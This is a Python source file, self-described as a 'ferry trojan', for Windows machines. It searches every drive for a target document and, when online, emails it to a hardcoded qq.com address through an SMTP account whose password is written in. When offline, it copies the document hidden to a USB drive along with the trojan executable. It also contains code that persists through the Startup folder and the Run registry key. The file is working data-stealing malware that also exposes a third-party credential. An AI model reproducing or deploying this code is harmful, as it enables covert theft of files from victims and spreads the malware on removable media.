# -*- coding: utf-8 -*-
#a ferry trojan

import os,shutil,smtplib,threading
import win32api,win32con,win32file,winreg
import email.mime.text
import email.mime.multipart
import urllib,sys,ctypes
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from sys import stdin
from os import walk
from os.path import join
from time import sleep
#from __future__ import print_function
#name = stdin.readline().rstrip()
name = 'aa.doc'
drive_all=["A:\\","B:\\","C:\\","D:\\","E:\\","F:\\","G:\\","H:\\","I:\\",  
                "J:\\","K:\\","L:\\","M:\\","N:\\","O:\\","P:\\","Q:\\","R:\\",  
                "S:\\","T:\\","U:\\","V:\\","W:\\","X:\\","Y:\\","Z:\\"]
trojanpath=os.path.abspath('.')

def addtoautorun():
    try:
        shutil.copy(trojanpath,r'C:\Users\administer\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\新建文件夹.exe')
    except Exception as err:
        print(err)
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0,
                        winreg.KEY_WRITE)
    winreg.SetValueEx(key, "Ferry_Trojan", 0, winreg.REG_SZ, trojanpath)

def search():
    for item in drive_all:
#        print(item)
        for root, dirs, files in walk(item):
            if name in dirs or name in files:
                path=join(root, name)
                print(path)
    print("found file!!!")
    return path

def usb_find():
    global timer
    for item in drive_all:
        if (win32file.GetDriveType(item)==2):
            break
    if os.path.isdir(item):
        print("found U-disk")
        return item
    else:
        print("not found U-disk")
        timer=threading.Timer(5.5,usb_find)
        timer.start()

def copy_file():
    path=search()
    drive=usb_find()
    if os.path.isfile(drive+name):
        print("file has writen!!!")
    else:
        shutil.copy(path,drive)
        attr=win32api.SetFileAttributes(drive+name,win32con.FILE_ATTRIBUTE_HIDDEN)
        print(attr)
        print("file writen successfully!!!")
    if os.path.isfile(drive+'新建文件夹.exe'):
        pass
    else:
        shutil.copy(trojanpath+'\\'+'新建文件夹.exe',drive)
    
def send_email():
    smtpHost='smtp.163.com'
    sendAddr='darinx999@163.com'
    password='Li0635'
    recipientAddrs='965108861@qq.com'
    subject='test email'
    content='test'
    msg = email.mime.multipart.MIMEMultipart()
    msg['from'] = sendAddr
    msg['to'] = recipientAddrs
    msg['subject'] = subject
    txt = email.mime.text.MIMEText(content, 'plain', 'utf-8')
    msg.attach(txt)
    path=search()
    part = MIMEApplication(open(path,'rb').read())
    part.add_header('Content-Disposition', 'attachment', filename=name)
    msg.attach(part)
    smtp = smtplib.SMTP()
    smtp.connect(smtpHost, '25')
    smtp.login(sendAddr, password)
    smtp.sendmail(sendAddr, recipientAddrs, str(msg))
    print("send successfully")
    smtp.quit()
'''
try:
    subject = 'test email'
    content = 'test'
#    send_email('smtp.163.com', 'darinx999@163.com', 'Li0635', '965108861@qq.com', subject, content)
except Exception as err:
    print(err)
'''
def main():
#    addtoautorun()
    exit_net=os.system('ping www.baidu.com')
    if exit_net==0:
        send_email()
    else:
        copy_file()
if __name__ == '__main__':
    main()
